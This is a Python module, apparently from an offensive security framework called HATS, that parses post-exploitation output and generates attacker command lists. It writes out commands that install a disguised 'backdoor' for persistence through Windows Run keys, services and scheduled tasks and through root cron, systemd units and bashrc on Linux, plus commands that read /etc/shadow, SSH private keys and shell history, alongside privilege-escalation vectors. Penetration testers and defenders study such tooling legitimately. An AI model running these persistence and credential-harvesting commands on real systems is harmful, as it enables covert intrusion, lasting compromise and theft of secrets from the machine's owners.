"""
Post-exploitation category implementation for HATS framework.
Handles post-exploitation tools and techniques.
"""

import re
from typing import Dict, List, Optional
from ..utils.logger import get_logger


class PostExploitCategory:
    """Handles post-exploitation tools like privilege escalation, persistence, etc."""
    
    def __init__(self):
        """Initialize the post-exploitation category."""
        self.logger = get_logger(__name__)
        self.category = "post_exploit"
    
    def parse_system_info(self, output: str, os_type: str = "windows") -> Dict:
        """
        Parse system information output.
        
        Args:
            output (str): Raw system info output
            os_type (str): Operating system type (windows/linux)
            
        Returns:
            Dict: Parsed system information
        """
        results = {
            'hostname': '',
            'os_version': '',
            'architecture': '',
            'users': [],
            'groups': [],
            'network_info': [],
            'running_processes': []
        }
        
        lines = output.split('\n')
        
        if os_type.lower() == "windows":
            return self._parse_windows_sysinfo(lines, results)
        else:
            return self._parse_linux_sysinfo(lines, results)
    
    def _parse_windows_sysinfo(self, lines: List[str], results: Dict) -> Dict:
        """Parse Windows system information."""
        for line in lines:
            line = line.strip()
            
            # Extract hostname
            if 'Host Name:' in line:
                hostname_match = re.search(r'Host Name:\s+(.+)', line)
                if hostname_match:
                    results['hostname'] = hostname_match.group(1).strip()
            
            # Extract OS version
            if 'OS Name:' in line:
                os_match = re.search(r'OS Name:\s+(.+)', line)
                if os_match:
                    results['os_version'] = os_match.group(1).strip()
            
            # Extract architecture
            if 'System Type:' in line:
                arch_match = re.search(r'System Type:\s+(.+)', line)
                if arch_match:
                    results['architecture'] = arch_match.group(1).strip()
        
        return results
    
    def _parse_linux_sysinfo(self, lines: List[str], results: Dict) -> Dict:
        """Parse Linux system information."""
        for line in lines:
            line = line.strip()
            
            # Extract hostname from uname
            if line.startswith('Linux'):
                parts = line.split()
                if len(parts) >= 2:
                    results['hostname'] = parts[1]
                if len(parts) >= 3:
                    results['os_version'] = parts[2]
        
        return results
    
    def parse_privilege_check(self, output: str, os_type: str = "windows") -> Dict:
        """
        Parse privilege escalation check output.
        
        Args:
            output (str): Raw privilege check output
            os_type (str): Operating system type
            
        Returns:
            Dict: Privilege escalation opportunities
        """
        results = {
            'current_privileges': [],
            'escalation_vectors': [],
            'writable_paths': [],
            'suid_binaries': [],
            'sudo_permissions': []
        }
        
        lines = output.split('\n')
        
        for line in lines:
            line = line.strip()
            
            if os_type.lower() == "windows":
                # Check for admin privileges
                if 'SeDebugPrivilege' in line:
                    results['current_privileges'].append('SeDebugPrivilege')
                if 'SeImpersonatePrivilege' in line:
                    results['escalation_vectors'].append('Token Impersonation')
            else:
                # Check for SUID binaries
                if line.startswith('-rwsr-x') or line.startswith('-rwsr-s'):
                    binary_match = re.search(r'/\S+$', line)
                    if binary_match:
                        results['suid_binaries'].append(binary_match.group(0))
                
                # Check sudo permissions
                if 'NOPASSWD' in line:
                    results['sudo_permissions'].append(line)
        
        return results
    
    def generate_system_enum_commands(self, os_type: str = "windows") -> List[str]:
        """
        Generate system enumeration commands.
        
        Args:
            os_type (str): Operating system type
            
        Returns:
            List[str]: List of enumeration commands
        """
        if os_type.lower() == "windows":
            return [
                'systeminfo',
                'whoami /all',
                'net users',
                'net localgroup administrators',
                'ipconfig /all',
                'netstat -an',
                'tasklist /svc',
                'wmic service list brief',
                'dir C:\\ /a',
                'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
            ]
        else:
            return [
                'uname -a',
                'id',
                'cat /etc/passwd',
                'cat /etc/group',
                'ifconfig -a',
                'netstat -antup',
                'ps aux',
                'ls -la /',
                'find / -perm -4000 2>/dev/null',
                'sudo -l'
            ]
    
    def generate_persistence_commands(self, os_type: str = "windows", 
                                    method: str = "registry") -> List[str]:
        """
        Generate persistence commands.
        
        Args:
            os_type (str): Operating system type
            method (str): Persistence method
            
        Returns:
            List[str]: List of persistence commands
        """
        if os_type.lower() == "windows":
            if method == "registry":
                return [
                    'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "UpdateTask" /t REG_SZ /d "C:\\temp\\backdoor.exe"',
                    'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "UpdateTask" /t REG_SZ /d "C:\\temp\\backdoor.exe"'
                ]
            elif method == "service":
                return [
                    'sc create "UpdateService" binPath= "C:\\temp\\backdoor.exe" start= auto',
                    'sc start "UpdateService"'
                ]
            elif method == "scheduled_task":
                return [
                    'schtasks /create /tn "UpdateTask" /tr "C:\\temp\\backdoor.exe" /sc onlogon /ru SYSTEM'
                ]
        else:
            if method == "cron":
                return [
                    'echo "@reboot /tmp/backdoor" >> /var/spool/cron/crontabs/root',
                    'crontab -l'
                ]
            elif method == "systemd":
                return [
                    'echo "[Unit]\\nDescription=Update Service\\n[Service]\\nExecStart=/tmp/backdoor\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/update.service',
                    'systemctl enable update.service',
                    'systemctl start update.service'
                ]
            elif method == "bashrc":
                return [
                    'echo "/tmp/backdoor &" >> ~/.bashrc',
                    'echo "/tmp/backdoor &" >> /etc/bash.bashrc'
                ]
        
        return []
    
    def generate_data_extraction_commands(self, target_type: str = "files") -> List[str]:
        """
        Generate data extraction commands.
        
        Args:
            target_type (str): Type of data to extract
            
        Returns:
            List[str]: List of extraction commands
        """
        if target_type == "files":
            return [
                'find / -name "*.pdf" 2>/dev/null',
                'find / -name "*.doc*" 2>/dev/null',
                'find / -name "*.xls*" 2>/dev/null',
                'find / -name "*password*" 2>/dev/null',
                'find / -name "*key*" 2>/dev/null'
            ]
        elif target_type == "credentials":
            return [
                'cat /etc/shadow',
                'cat ~/.ssh/id_rsa',
                'cat ~/.bash_history',
                'grep -r "password" /var/log/',
                'find / -name "*.key" 2>/dev/null'
            ]
        elif target_type == "network":
            return [
                'arp -a',
                'route -n',
                'ss -tulpn',
                'cat /etc/hosts',
                'cat /etc/resolv.conf'
            ]
        
        return []
    
    def get_privilege_escalation_vectors(self, os_type: str = "windows") -> Dict[str, List[str]]:
        """
        Get common privilege escalation vectors.
        
        Args:
            os_type (str): Operating system type
            
        Returns:
            Dict[str, List[str]]: Escalation vectors by category
        """
        if os_type.lower() == "windows":
            return {
                'token_impersonation': [
                    'SeImpersonatePrivilege',
                    'SeAssignPrimaryTokenPrivilege'
                ],
                'service_exploits': [
                    'Unquoted Service Paths',
                    'Weak Service Permissions',
                    'Service Binary Hijacking'
                ],
                'registry_exploits': [
                    'AlwaysInstallElevated',
                    'Weak Registry Permissions'
                ],
                'dll_hijacking': [
                    'DLL Search Order Hijacking',
                    'Phantom DLL Hijacking'
                ]
            }
        else:
            return {
                'suid_binaries': [
                    '/bin/bash',
                    '/usr/bin/find',
                    '/usr/bin/vim'
                ],
                'sudo_exploits': [
                    'Sudo Version Exploits',
                    'Sudo NOPASSWD Misconfiguration'
                ],
                'kernel_exploits': [
                    'Dirty COW',
                    'Privilege Escalation via /proc/*/mem'
                ],
                'cron_exploits': [
                    'Writable Cron Scripts',
                    'PATH Environment Variable'
                ]
            }
